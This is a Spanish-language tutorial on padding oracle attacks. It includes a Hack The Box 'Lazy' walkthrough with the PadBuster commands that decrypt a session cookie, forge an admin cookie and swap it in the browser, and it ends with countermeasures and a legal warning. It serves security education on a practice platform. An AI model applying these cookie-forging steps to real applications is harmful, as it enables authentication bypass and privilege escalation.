Manipulación de Cookies

Ataques Padding Oracle y Escalación de Privilegios

¿Qué es un Ataque Padding Oracle?

Definición: Un Padding Oracle es una vulnerabilidad criptográfica que explota las respuestas de error del sistema al manipular el relleno (padding) en mensajes cifrados. Este ataque se centra en sistemas que utilizan cifrado de bloques en modos como CBC (Cipher Block Chaining), permitiendo a los atacantes deducir información sensible o forjar datos cifrados válidos.

Los ataques Padding Oracle son especialmente efectivos contra:

  • Cookies de sesión cifradas: Manipulación para escalación de privilegios
  • Tokens de autenticación: Forjado de credenciales válidas
  • Parámetros cifrados: Alteración de datos sensibles en URLs
  • Mensajes encriptados: Descifrado sin conocer la clave

Impacto de Seguridad: Los ataques Padding Oracle pueden resultar en compromiso completo de la autenticación, escalación de privilegios, y revelación de datos sensibles cifrados.

PadBuster - Herramienta Principal

PadBuster: Herramienta especializada para automatizar ataques Padding Oracle contra aplicaciones web que utilizan cifrado de bloques CBC. Permite tanto descifrar datos existentes como generar nuevos datos cifrados válidos.

Características de PadBuster:

  • Detección automática: Identifica vulnerabilidades Padding Oracle
  • Descifrado: Revela contenido de cookies/tokens cifrados
  • Cifrado personalizado: Genera nuevos datos cifrados
  • Soporte multi-formato: Base64, hexadecimal, URL encoding

Caso Práctico: HTB Lazy

Escalación de Privilegios via Cookie Manipulation - HTB Lazy (10.10.10.18)
Escenario del ataque:
  • Objetivo: Obtener cookie de sesión del usuario admin
  • Usuario actual: tester123 (privilegios limitados)
  • Técnica: Padding Oracle con PadBuster
  • Resultado esperado: Escalación a administrador

Metodología de Explotación:

1
Obtención de Cookie Inicial
Autenticación como usuario tester123 y extracción de cookie de sesión
2
Análisis con PadBuster
Identificación del patrón de cifrado y estructura de la cookie
3
Generación de Cookie Admin
Forjado de nueva cookie con valor "user=admin"
4
Escalación Exitosa
Sustitución de cookie y acceso como administrador

Fase 1: Extracción de Cookie Inicial

Después de autenticarse como usuario tester123, utilizamos las herramientas de desarrollo del navegador para extraer la cookie de sesión:

Cookie Extraída
Cookie: auth=b9Znp%2FQiNZn7bs4KSAjBrepi%2BTBR0Mb5

Fase 2: Análisis Padding Oracle

Ejecutamos PadBuster para analizar el patrón de cifrado y descifrar el contenido de la cookie:

Comando PadBuster - Fase Análisis
padbuster http://10.10.10.18/index.php \ 'b9Znp%2FQiNZn7bs4KSAjBrepi%2BTBR0Mb5' \ 8 \ -cookies 'auth=b9Znp%2FQiNZn7bs4KSAjBrepi%2BTBR0Mb5'

Parámetros del comando:

  • http://10.10.10.18/index.php: URL objetivo vulnerable
  • 'b9Znp%2F...': Cookie cifrada a analizar
  • 8: Tamaño de bloque (8 bytes para DES/3DES)
  • -cookies: Especifica donde enviar la cookie en las peticiones

Resultado del Análisis:

Cookie descifrada exitosamente:

user=tester123

PadBuster ha identificado que la cookie contiene el nombre del usuario en texto plano cifrado con CBC padding.

Fase 3: Generación de Cookie Admin

Utilizamos PadBuster en modo de cifrado para generar una nueva cookie con el valor "user=admin":

Comando PadBuster - Generación
padbuster http://10.10.10.18/index.php \ 'b9Znp%2FQiNZn7bs4KSAjBrepi%2BTBR0Mb5' \ 8 \ -cookies 'auth=b9Znp%2FQiNZn7bs4KSAjBrepi%2BTBR0Mb5' \ -plaintext 'user=admin'

Cookie Admin Generada:

Nueva cookie cifrada:

Cookie Admin
BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA

Esta cookie cifrada representa "user=admin" usando el mismo algoritmo y clave del servidor.

Fase 4: Escalación de Privilegios

Sustituimos la cookie original por la nueva cookie de administrador en las herramientas de desarrollo del navegador:

Sustitución de Cookie
// Cookie original auth=b9Znp%2FQiNZn7bs4KSAjBrepi%2BTBR0Mb5 // Cookie admin generada auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA

Resultado: Acceso exitoso como administrador sin conocer credenciales. El servidor acepta la cookie forjada y otorga privilegios de administrador.

Vectores de Ataque Adicionales

Técnicas Avanzadas de Padding Oracle

  • Time-based Oracle: Análisis de diferencias en tiempo de respuesta
  • Error-based Oracle: Explotación de mensajes de error específicos
  • Blind Oracle: Detección basada en comportamiento de la aplicación
  • XML Padding Oracle: Ataques contra sistemas XML cifrados

Medidas de Protección

Contramedidas Esenciales:

  • Authenticated Encryption: Usar AES-GCM en lugar de CBC
  • HMAC Verification: Verificar integridad antes del descifrado
  • Error Handling: Respuestas genéricas para todos los errores
  • Time Constant Operations: Evitar diferencias temporales

Consideraciones Éticas y Legales

Advertencia Legal: Los ataques Padding Oracle solo deben utilizarse en:

  • Aplicaciones propias o con autorización explícita por escrito
  • Entornos de pentesting con contrato legal válido
  • Plataformas de práctica autorizadas (HTB, TryHackMe)
  • Laboratorios controlados de ciberseguridad

La manipulación no autorizada de cookies y sistemas de autenticación constituye un delito grave según las legislaciones locales e internacionales.
